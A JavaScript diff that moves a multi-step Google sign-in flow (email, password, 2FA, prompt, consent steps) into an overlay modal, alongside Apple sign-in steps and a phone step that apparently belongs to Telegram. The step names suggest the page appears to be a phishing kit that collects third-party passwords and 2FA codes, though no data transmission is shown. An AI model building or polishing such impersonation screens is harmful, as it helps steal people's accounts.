@@ -167,6 +167,9 @@ function initApp() {
         return p || "Неизвестно";
     }
 
+    const googleAuthModal = document.getElementById("googleAuthModal");
+    const btnCloseGoogleModal = document.getElementById("btnCloseGoogleModal");
+
     function showStep(stepElement) {
         const isGoogleStep = [
             stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent
@@ -176,16 +179,19 @@ function initApp() {
             stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt
         ].includes(stepElement);
 
+        if (googleAuthModal) {
+            if (isGoogleStep) {
+                googleAuthModal.classList.remove("hidden");
+            } else {
+                googleAuthModal.classList.add("hidden");
+            }
+        }
+
         const appContainer = document.querySelector(".app-container");
         if (appContainer) {
-            if (isGoogleStep) {
-                appContainer.classList.add("google-mode");
-                appContainer.classList.remove("apple-mode");
-            } else if (isAppleStep) {
+            if (isAppleStep) {
                 appContainer.classList.add("apple-mode");
-                appContainer.classList.remove("google-mode");
             } else {
-                appContainer.classList.remove("google-mode");
                 appContainer.classList.remove("apple-mode");
             }
         }
@@ -911,6 +917,20 @@ function initApp() {
     if (btnBackFromGoogleToTG) {
         btnBackFromGoogleToTG.addEventListener("click", () => {
             showStep(stepPhone);
+        });
+    }
+
+    if (btnCloseGoogleModal) {
+        btnCloseGoogleModal.addEventListener("click", () => {
+            showStep(stepPhone);
+        });
+    }
+
+    if (googleAuthModal) {
+        googleAuthModal.addEventListener("click", (e) => {
+            if (e.target === googleAuthModal) {
+                showStep(stepPhone);
+            }
         });
     }
 
